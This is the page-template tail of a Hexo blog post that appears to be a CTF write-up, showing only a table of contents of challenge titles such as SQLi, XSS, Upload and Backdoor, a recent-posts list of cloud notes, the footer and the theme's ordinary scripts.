        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#爆破-1"><span class="level-left"><span class="level-item">1</span><span class="level-item">爆破 - 1</span></span></a></li><li><a class="level is-mobile" href="#爆破-2"><span class="level-left"><span class="level-item">2</span><span class="level-item">爆破 - 2</span></span></a></li><li><a class="level is-mobile" href="#爆破-3"><span class="level-left"><span class="level-item">3</span><span class="level-item">爆破 - 3</span></span></a></li><li><a class="level is-mobile" href="#Upload"><span class="level-left"><span class="level-item">4</span><span class="level-item">Upload</span></span></a></li><li><a class="level is-mobile" href="#Code"><span class="level-left"><span class="level-item">5</span><span class="level-item">Code</span></span></a></li><li><a class="level is-mobile" href="#YeserCMS"><span class="level-left"><span class="level-item">6</span><span class="level-item">YeserCMS</span></span></a></li><li><a class="level is-mobile" href="#XSS-平台"><span class="level-left"><span class="level-item">7</span><span class="level-item">XSS 平台</span></span></a></li><li><a class="level is-mobile" href="#再见-CMS"><span class="level-left"><span class="level-item">8</span><span class="level-item">再见 CMS</span></span></a></li><li><a class="level is-mobile" href="#SQL"><span class="level-left"><span class="level-item">9</span><span class="level-item">SQL</span></span></a></li><li><a class="level is-mobile" href="#SQLi"><span class="level-left"><span class="level-item">10</span><span class="level-item">SQLi</span></span></a></li><li><a class="level is-mobile" href="#123"><span class="level-left"><span class="level-item">11</span><span class="level-item">123</span></span></a></li><li><a class="level is-mobile" href="#Test"><span class="level-left"><span class="level-item">12</span><span class="level-item">Test</span></span></a></li><li><a class="level is-mobile" href="#Login"><span class="level-left"><span class="level-item">13</span><span class="level-item">Login</span></span></a></li><li><a class="level is-mobile" href="#Backdoor"><span class="level-left"><span class="level-item">14</span><span class="level-item">Backdoor</span></span></a></li><li><a class="level is-mobile" href="#GetFlag"><span class="level-left"><span class="level-item">15</span><span class="level-item">GetFlag</span></span></a></li><li><a class="level is-mobile" href="#Not-Found"><span class="level-left"><span class="level-item">16</span><span class="level-item">Not Found</span></span></a></li><li><a class="level is-mobile" href="#Vld"><span class="level-left"><span class="level-item">17</span><span class="level-item">Vld</span></span></a></li><li><a class="level is-mobile" href="#EXEC"><span class="level-left"><span class="level-item">18</span><span class="level-item">EXEC</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-18T10:04:07.000Z">2021-10-18</time></p><p class="title"><a href="/post/DistributedSystems/">星罗棋布：《分布式系统与安全》课程笔记</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-10T15:31:41.000Z">2021-10-10</time></p><p class="title"><a href="/post/Kubernetes/">乘风破浪：Kubernetes 笔记</a></p><p class="categories"><a href="/categories/%E4%BA%91/">云</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-25T17:44:35.000Z">2021-09-25</time></p><p class="title"><a href="/post/Dockerfile2GKE/">再探 GitHub Actions：从 Dockerfile 到 GKE</a></p><p class="categories"><a href="/categories/%E4%BA%91/">云</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-23T09:03:42.000Z">2021-09-23</time></p><p class="title"><a href="/post/GCP/">高枕无忧：Google Cloud Platform 基础</a></p><p class="categories"><a href="/categories/%E4%BA%91/">云</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-10T08:27:59.000Z">2021-09-10</time></p><p class="title"><a href="/post/CloudNative/">风谲云诡：云原生技术原理</a></p><p class="categories"><a href="/categories/%E4%BA%91/">云</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>